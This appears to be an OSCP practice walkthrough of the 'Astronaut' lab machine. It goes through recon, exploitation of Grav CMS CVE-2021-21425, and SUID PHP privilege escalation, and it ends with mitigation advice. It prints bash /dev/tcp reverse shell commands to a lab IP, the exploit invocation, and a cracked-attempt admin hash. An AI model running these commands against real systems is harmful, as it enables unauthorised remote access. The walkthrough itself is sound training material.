---
title: Astronaut
date: 2025-04-30
categories: [oscp, pg-practice]
tags: [oscp-preparation, walkthrough, CVE-2021-21425, suid-php-privesc] 
image: astro.jpg
media_subpath: /assets/img/posts/2025-04-30-astronaut/
---

## Introduction

In this walkthrough, I will demonstrate how to exploit an unauthenticated arbitrary YAML write/update vulnerability in Grav CMS, which results in remote code execution (RCE) and provides an initial foothold on the target system. To escalate privileges, we identify and exploit a misconfigured PHP binary with the SUID bit set, allowing us to execute commands with elevated privileges. Let’s start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open 
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 22

We usually skip SSH.

## Web

### Port 80

- Version - Apache httpd 2.4.41

```bash
searchsploit apache 2.4.41
```

**No result.**

- robots.txt and sitemap.xml
    
    ![image.png](image%203.png)
    

- **Directory Fuzzing**

```bash
gobuster dir -u http://$IP/grav-admin -w /usr/share/wordlists/dirb/common.txt -t 42
```

![image.png](image%204.png)

## Exploitation

I have seen one vulnerability from unauthenticated standpoint which has CVE-2021-21425.

I tried running the one from exploitdb but for some reason it keeps failing, so I searched for github scripts and found one [here](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py&ved=2ahUKEwjAqc7uj4CNAxX36gIHHfeUMPEQFnoECBkQAQ&usg=AOvVaw3v1P1_REi5CirVsRlavjI_)
I first run it with id:

```bash
python3 exploit.py -c id -t http://$IP/grav-admin
```

![image.png](image%205.png)

It seems it worked let’s try with reverse shell.

It failed with:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.45.155/80 0>&1’
```

[Reverse Shell CheatSheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp)

```bash
python3 exploit.py -c '0<&196;exec 196<>/dev/tcp/192.168.45.155/80; sh <&196 >&196 2>&196' -t http://$IP/grav-admin
```

![image.png](image%206.png)

So we got a shell:

![image.png](image%207.png)

We don’t have access to `local.txt` as it lies under home directory of the user `alex.`

![image.png](image%208.png)

## Lateral Movement

Under `/html/grav-admin/user/accounts` we can see `admin.yaml` file where we can find admin user hash.

![image.png](image%209.png)

[Hash Identifier](https://hashes.com/en/tools/hash_identifier)

![image.png](image%2010.png)

This hash is very hard to crack I will wait for 4-5 minutes.

```bash
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force
```

**No result.**

## Credentials

```bash
admin : $2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.
```

## Privilege Escalation

Searching for SUID binaries I found one unusual:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image.png](image%2011.png)

[PHP - GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid)

![image.png](image%2012.png)

Now our effective User ID is root.

## Mitigation

- **Grav CMS Hardening:**
    - Regularly update Grav CMS and its plugins to the latest secure versions.
    - Restrict write permissions on configuration and YAML files to only trusted users and processes.
    - Use web application firewalls (WAFs) to detect and block malicious payloads targeting configuration files.
- **Input Validation & Authentication:**
    - Ensure that only authenticated and authorized users can make updates to YAML or other critical configuration files.
    - Implement strict validation and sanitization of input fields to prevent unauthorized changes and injections.
- **SUID Binary Control:**
    - Avoid setting the SUID bit on binaries that do not explicitly require it, especially interpreters like PHP.
    - Regularly audit the file system for unexpected SUID binaries using tools like `find / -perm -4000`.
    - Apply the principle of least privilege and remove unnecessary packages or binaries from production systems.
- **User Privilege Management:**
    - Segment user privileges tightly and avoid granting unnecessary root access.
    - Use tools like `sudo` with logging and restrictions, rather than relying on SUID binaries for privilege escalation.
